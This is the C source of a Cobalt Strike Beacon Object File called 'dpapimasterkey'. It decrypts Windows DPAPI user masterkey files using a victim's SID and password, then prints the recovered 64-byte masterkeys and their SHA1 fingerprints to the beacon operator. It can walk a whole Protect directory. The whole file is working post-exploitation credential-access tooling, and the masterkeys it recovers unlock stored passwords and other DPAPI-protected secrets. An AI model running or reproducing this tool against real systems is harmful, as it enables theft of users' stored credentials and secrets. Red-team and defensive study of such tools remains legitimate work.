/*
 * bof-dpapimasterkey <masterkey-file|directory> <user-sid> <password>
 *
 * Decrypt a user DPAPI masterkey file from
 * %APPDATA%\Microsoft\Protect\<SID>\ using the user's plaintext password.
 *
 * The user key is derived exactly as Windows does:
 *   key = HMAC-SHA1( SHA1(UTF-16LE(password)), UTF-16LE(sid + "\0") )
 * The masterkey payload is then PBKDF2-HMAC-SHA1 + AES-256-CBC, and the
 * embedded HMAC is verified before the 64-byte masterkey is printed together
 * with its SHA1 fingerprint (the value used to key DPAPI blobs).
 *
 * Only the current user's DPAPI format (SHA1/SHA512, AES-256) is handled.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "cryptoh.h"

static unsigned long long mk_qword(const unsigned char *p)
{
    return (unsigned long long)p[0] | ((unsigned long long)p[1] << 8) |
           ((unsigned long long)p[2] << 16) | ((unsigned long long)p[3] << 24) |
           ((unsigned long long)p[4] << 32) | ((unsigned long long)p[5] << 40) |
           ((unsigned long long)p[6] << 48) | ((unsigned long long)p[7] << 56);
}

static unsigned int mk_dword(const unsigned char *p)
{
    return p[0] | ((unsigned int)p[1] << 8) |
           ((unsigned int)p[2] << 16) | ((unsigned int)p[3] << 24);
}

static void print_hexbuf(const unsigned char *p, unsigned int n)
{
    const char *h = "0123456789abcdef";
    char line[160];
    unsigned int i, o = 0;
    for (i = 0; i < n; i++) {
        line[o++] = h[(p[i] >> 4) & 0xf];
        line[o++] = h[p[i] & 0xf];
        if (o >= sizeof(line) - 2 || i + 1 == n) {
            line[o] = 0;
            BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", line);
            o = 0;
        }
    }
}

static int derive_userkey(const char *sid, const char *password,
                          unsigned char out[20])
{
    wchar_t wpw[512], wsid[256];
    unsigned char sha[20];
    int n, m;

    n = bof_a2w(password, wpw, 512);
    m = bof_a2w(sid, wsid, 256);
    if (n <= 0 || m <= 0) return -1;
    wsid[m] = 0;
    if (bof_sha1(wpw, (unsigned int)n * 2, sha) != 0) return -1;
    return bof_hmac_sha1(sha, 20, wsid, (unsigned int)(m + 1) * 2, out);
}

static int decrypt_one(const char *path, const char *sid, const char *password)
{
    unsigned char *data = NULL;
    unsigned int size = 0;
    unsigned long long mklen, bklen, chlen, dklen;
    unsigned int iter, hashalgo, cryptalgo;
    unsigned char userkey[20], derived[64], *plain = NULL;
    int plainlen = 0, hashlen, ok = -1;
    unsigned char mk[64], calc[64], hkey[64];
    const unsigned char *salt, *payload;
    unsigned int payloadlen = 0;
    char fp[64];

    if (bof_read_file(path, &data, &size) != 0 || size < 160) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: unreadable/short\n", path);
        return -1;
    }
    mklen = mk_qword(data + 96);
    bklen = mk_qword(data + 104);
    chlen = mk_qword(data + 112);
    dklen = mk_qword(data + 120);
    if (mklen < 32 || 128ULL + mklen > size) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "  %s: no masterkey (master=%llu backup=%llu credhist=%llu dom=%llu)\n",
                     path, mklen, bklen, chlen, dklen);
        goto done;
    }

    salt = data + 128 + 4;
    iter = mk_dword(data + 128 + 20);
    hashalgo = mk_dword(data + 128 + 24);
    cryptalgo = mk_dword(data + 128 + 28);
    payload = data + 128 + 32;
    payloadlen = (unsigned int)(mklen - 32);
    if (iter == 0 || iter > 10000000 || payloadlen < 16) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: invalid masterkey parameters\n", path);
        goto done;
    }
    if (hashalgo != 0x8004 && hashalgo != 0x800e) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: unsupported hash algo 0x%x\n",
                     path, hashalgo);
        goto done;
    }
    if (cryptalgo != 0x6610) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: unsupported crypt algo 0x%x\n",
                     path, cryptalgo);
        goto done;
    }

    if (derive_userkey(sid, password, userkey) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: key derivation failed\n", path);
        goto done;
    }
    if (bof_pbkdf2_sha1(userkey, sizeof(userkey), salt, 16, iter,
                        derived, 48) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: PBKDF2 failed\n", path);
        goto done;
    }

    plain = (unsigned char *)KERNEL32$VirtualAlloc(NULL, payloadlen + 16,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!plain) goto done;
    plainlen = bof_aes_cbc_decrypt(derived, 32, derived + 32,
                                   payload, (int)payloadlen, plain,
                                   (int)payloadlen + 16);
    if (plainlen < 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: AES decrypt failed\n", path);
        goto done;
    }

    hashlen = (hashalgo == 0x800e) ? 64 : 20;
    if (plainlen < 16 + hashlen + 64) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: decrypted payload too short\n", path);
        goto done;
    }
    bof_memcpy(mk, plain + plainlen - 64, 64);
    bof_memcpy(hkey, plain + 16, hashlen);
    if (hashalgo == 0x800e)
        bof_hmac_sha512(userkey, sizeof(userkey), plain, 16, hkey);
    else
        bof_hmac_sha1(userkey, sizeof(userkey), plain, 16, hkey);
    if (hashalgo == 0x800e)
        bof_hmac_sha512(hkey, sizeof(hkey), mk, 64, calc);
    else
        bof_hmac_sha1(hkey, 20, mk, 64, calc);

    if (bof_memcmp(calc, plain + 16, hashlen) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: HMAC mismatch (wrong password?)\n",
                     path);
        goto done;
    }

    {
        unsigned char sh[20];
        bof_sha1(mk, 64, sh);
        {
            const char *hx = "0123456789abcdef";
            int i;
            for (i = 0; i < 20; i++) {
                fp[i * 2] = hx[(sh[i] >> 4) & 0xf];
                fp[i * 2 + 1] = hx[sh[i] & 0xf];
            }
            fp[40] = 0;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] %s\n", path);
    BeaconPrintf(CALLBACK_OUTPUT,
                 "  version=%u iter=%u hash=0x%x crypt=0x%x\n",
                 mk_dword(data + 128), iter, hashalgo, cryptalgo);
    BeaconPrintf(CALLBACK_OUTPUT, "  masterkey:\n");
    print_hexbuf(mk, 64);
    BeaconPrintf(CALLBACK_OUTPUT, "  sha1: %s\n", fp);
    ok = 0;

done:
    if (plain) {
        bof_memzero(plain, payloadlen + 16);
        KERNEL32$VirtualFree(plain, 0, MEM_RELEASE);
    }
    if (data) KERNEL32$VirtualFree(data, 0, MEM_RELEASE);
    return ok;
}

void go(char *args, int alen)
{
    datap parser;
    char *path, *sid, *password;
    int plen, slen, pwlen;
    DWORD attr;

    BeaconDataParse(&parser, args, alen);
    path     = BeaconDataExtract(&parser, &plen);
    sid      = BeaconDataExtract(&parser, &slen);
    password = BeaconDataExtract(&parser, &pwlen);
    if (!path || !path[0] || !sid || !sid[0] || !password) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: dpapimasterkey <file|dir> <user-sid> <password>\n");
        return;
    }
    if (!password) password = "";

    attr = KERNEL32$GetFileAttributesA(path);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_ERROR, "path not found: %s\n", path);
        return;
    }

    if (attr & FILE_ATTRIBUTE_DIRECTORY) {
        char pattern[MAX_PATH + 8];
        WIN32_FIND_DATAA fd;
        HANDLE h;
        int found = 0;

        bof_strncpy(pattern, path, sizeof(pattern));
        bof_strncat(pattern, "\\*", sizeof(pattern) - bof_strlen(pattern) - 1);
        h = KERNEL32$FindFirstFileA(pattern, &fd);
        if (h == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "cannot enumerate %s\n", path);
            return;
        }
        do {
            char full[MAX_PATH + 8];
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            bof_strncpy(full, path, sizeof(full));
            bof_strncat(full, "\\", sizeof(full) - bof_strlen(full) - 1);
            bof_strncat(full, fd.cFileName, sizeof(full) - bof_strlen(full) - 1);
            if (decrypt_one(full, sid, password) == 0) found++;
        } while (KERNEL32$FindNextFileA(h, &fd));
        KERNEL32$FindClose(h);
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d masterkey file(s) decrypted\n", found);
    } else {
        decrypt_one(path, sid, password);
    }
}
